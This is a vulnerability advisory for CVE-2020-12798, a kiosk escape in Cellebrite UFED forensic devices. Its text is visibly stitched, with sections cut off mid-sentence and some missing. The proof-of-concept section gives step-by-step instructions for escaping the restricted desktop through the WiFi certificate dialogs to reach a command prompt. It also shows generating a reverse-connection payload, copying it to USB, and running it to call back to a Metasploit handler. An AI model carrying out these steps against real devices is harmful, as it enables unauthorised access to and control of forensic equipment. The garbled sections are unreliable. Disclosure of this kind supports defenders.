1. Vulnerability Details

     Affected Vendor: Cellebrite
     Affected Product: UFED
     Affected Version: 5.0 - 7.5.0.845
     Platform: Embedded Windows
     CWE Classification: CWE-269: Improper Privilege Management,
                         CWE-20: Input Validation Error
     CVE ID: CVE-2020-12798


2. Vulnerability Description

     Cellebrite UFED device implements local operating system
     policies that can be circumvented to obtain a command
     prompt. From there privilege escalation is possible using
     public exploits.


3. Technical Description

     The Cellebrite UFED device implements local operating system
     policies which are designed to limit access to operating system
     functionality. These include but may not be limited to:

     1. Preventing access to dialog such as Run, File Browser,
     and Explorer.

     and

     2. Preventing access to process and application management tools
     such as Task Manager and the Control Panel.

     These policies can be circumvented by using functionality
     that is permitted by the policy governing the use of the user
     desktop. A user can leverage the Wireless Network connection
     string to select certificate based authentication, which then
     enables file dialogs that are able to be used to launch a
     command prompt. Following this, privileges can be elevated
     using off the shelf and publicly available exploits relevant
     to the specific Windows version in use.


4. Mitigation and Remediation Recommendation

     The vendor has informed KoreLogic that this vulnerability is
     vendor was uncertain of the exact version number that remediated
     this attack vector.

7. Proof of Concept

     payload that will initiate a remote connection to a C2. Copy
     the payload to a USB drive. Following this, use the msfconsole
     binary to create a C2 connection handler with the multi/handler
     functionality.

       [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
       [-] No arch selected, selecting arch: x86 from the payload
       No encoder or badchars specified, outputting raw payload
       Payload size: 341 bytes
       Final size of exe file: 73802 bytes
       Saved as: payload.exe
       $ sudo mount -o rw /dev/sda1 a/
       $ sudo cp payload.exe a/
       $ sync
       $ sudo umount a/

     Now insert the USB drive where payload.exe resides into a
     target Cellebrite device. Next, follow the steps below:

     1. Open the Wireless Network Connection screen by clicking
     on the WiFi icon in the bottom right hand corner of the
     screen. This should be next to the system clock.

     2. Select "Change advanced settings" -- this will bring up a
     screen called Windows Network Connection Properties. Choose
     the Wireless Networks tab.

     3. Under the Preferred networks section, click the Add button
     and then select the Authentication tab. Make sure "Enable IEEE
     802.1x authentication for this network" is enabled.

     4. Under EAP Type, select "Smart Card or other Certificate"
     and then click the Properties button.

     5. Under Trusted Root Certificate Authorities click the
     View Certificate button. This will bring up a screen called
     Certificate, choose the Details tab and click the "Copy to
     File" button. This will bring up a screen called Certificate
     Export Wizard.

     6. Click Next and select any of the available export format
     options. For example, choose the "DER encoded binary X.509"
     option and click next.

     7. Instead of typing out a export path click the Browse
     button to open a file dialog. In the "File Name" box type:
     \WINDOWS\System32\ and under "Save as type" select the "All
     Files (*.*)" option. Hit the enter key.

     8. Locate the cmd.exe file then drag and drop any DLL over
     it. For example, choose the clusapi.dll file located near the
     cmd.exe executable. This will open a Command Prompt screen as
     an unprivileged user.

     9. Type the drive letter to change into the USB drive containing
     the payload.exe file.

       C:\windows\system32>D:
       D:\>payload.exe

     This results in a connection back into Metasploit.
